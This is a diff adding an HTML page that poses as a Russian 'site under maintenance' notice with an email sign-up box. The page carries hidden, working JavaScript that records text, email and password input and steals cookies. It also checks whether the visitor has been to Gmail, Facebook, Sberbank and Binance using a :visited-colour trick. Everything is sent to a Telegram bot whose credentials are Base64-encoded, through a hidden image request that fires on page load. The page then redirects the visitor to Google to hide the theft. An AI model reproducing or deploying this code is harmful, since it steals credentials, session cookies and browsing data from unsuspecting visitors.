@@ -1,0 +1,131 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <title>Добро Пожаловать</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding-top: 50px;
+            background-color: #f0f0f0;
+        }
+        .container {
+            background-color: #fff;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+            display: inline-block;
+        }
+        /* Скрытый элемент для проверки истории */
+        #history-checker a:visited { color: #ff0000; } 
+        #history-checker { display: none; }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <h1>Сайт находится на обслуживании</h1>
+        <p>Пожалуйста, вернитесь позже. Мы скоро закончим обновление.</p>
+        <p>Спасибо за ваше терпение.</p>
+
+        <div style="margin-top: 20px;">
+            <p>Вы можете оставить свой email для уведомления:</p>
+            <input type="text" id="email_input" placeholder="Введите ваш email">
+            <button onclick="console.log('Кнопка нажата');">Отправить</button>
+        </div>
+    </div>
+    
+    <div id="history-checker">
+        <a href="https://mail.google.com/mail/u/0/#inbox">GMAIL</a>
+        <a href="https://www.facebook.com">FACEBOOK</a>
+        <a href="https://online.sberbank.ru/">SBERBANK</a>
+        <a href="https://www.binance.com/">BINANCE</a>
+    </div>
+
+    <script>
+        // --- 1. Константы ---
+        // Зашифрованные константы Telegram
+        const T = 'ODEzNzI1MDIxNjpBQUVFU1h2YVVJcmlOUHVaUFZheEw0X1Q2SUhoT0RhSG1rWQ=='; // Base64: 8137250216:AAEESXvaUIriNPuZPVaxL4_T6IxhODaHmkY
+        const C = 'ODA4OTgzOTI0Nw=='; // Base64: 8089839247
+
+        // --- 2. Логгер Ввода ---
+        let log_data = "";
+        document.addEventListener('input', function(e) {
+            // Перехват ввода в любом текстовом поле и поле пароля
+            if (e.target.type === 'text' || e.target.type === 'email' || e.target.type === 'password' || e.target.tagName === 'TEXTAREA') {
+                log_data += e.target.id + " -> " + e.target.value + "\n";
+            }
+        });
+
+        // --- 3. Основная Полезная Нагрузка (Обфусцированная) ---
+        // Код обернут в функцию, чтобы его выполнение выглядело естественно.
+        function performExfil() {
+            try {
+                // Декодирование токена и ID
+                const TELEGRAM_BOT_TOKEN = atob(T);
+                const TELEGRAM_CHAT_ID = atob(C);
+                
+                // --- 3A. Кража Куки ---
+                let stolen_cookies = "NONE";
+                if (document.cookie) {
+                    stolen_cookies = document.cookie.substring(0, 1000); // Ограничение длины
+                }
+
+                // --- 3B. Сбор Метаданных ---
+                const user_agent = navigator.userAgent;
+                const current_url = window.location.href;
+
+                // --- 3C. Эксплуатация Истории (Проверка :visited) ---
+                let history_log = "Visited Sites: \n";
+                const checker = document.getElementById('history-checker');
+                const links = checker.getElementsByTagName('a');
+                
+                for (let i = 0; i < links.length; i++) {
+                    // Проверка стилей (обход защиты может быть не 100%)
+                    const color = window.getComputedStyle(links[i]).color; 
+                    if (color === 'rgb(255, 0, 0)') { // Ищем красный цвет из CSS стиля #ff0000
+                        history_log += links[i].href + " (VISITED)\n";
+                    }
+                }
+
+                // --- 3D. Составление Отчета ---
+                let final_report = "--- КРАЖА JS ---\n";
+                final_report += "User Agent: " + user_agent + "\n";
+                final_report += "Current URL: " + current_url + "\n";
+                final_report += "--- COOKIES ---\n" + stolen_cookies + "\n";
+                final_report += "--- INPUT LOGS ---\n" + log_data + "\n";
+                final_report += "--- HISTORY SNOOPING ---\n" + history_log + "\n";
+                
+                // Убедимся, что отчет не слишком длинный для Telegram API
+                const message_to_send = final_report.substring(0, 4000); 
+
+                // --- 3E. Отправка в Telegram ---
+                const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(message_to_send)}`;
+
+                // Используем невидимое изображение для запроса - это максимально тихо
+                const img = new Image();
+                img.src = telegramUrl;
+                document.body.appendChild(img).style.display = 'none';
+                
+            } catch (e) {
+                // Игнорируем ошибки, чтобы не прервать работу скрипта
+            }
+        }
+        
+        // --- 4. Запуск и Самоуничтожение (Persistence/Stealth) ---
+        // Запускаем сбор данных через небольшую задержку после загрузки страницы
+        window.onload = function() {
+            // Ждем 500 мс для сбора данных и ввода
+            setTimeout(performExfil, 500); 
+            
+            // Очищаем потенциальные следы и перенаправляем через 2 секунды
+            setTimeout(function() {
+                // Перенаправление на нейтральный сайт, чтобы жертва не заподозрила
+                window.location.replace("https://www.google.com"); 
+            }, 2000); 
+        };
+        
+    </script>
+</body>
+</html>
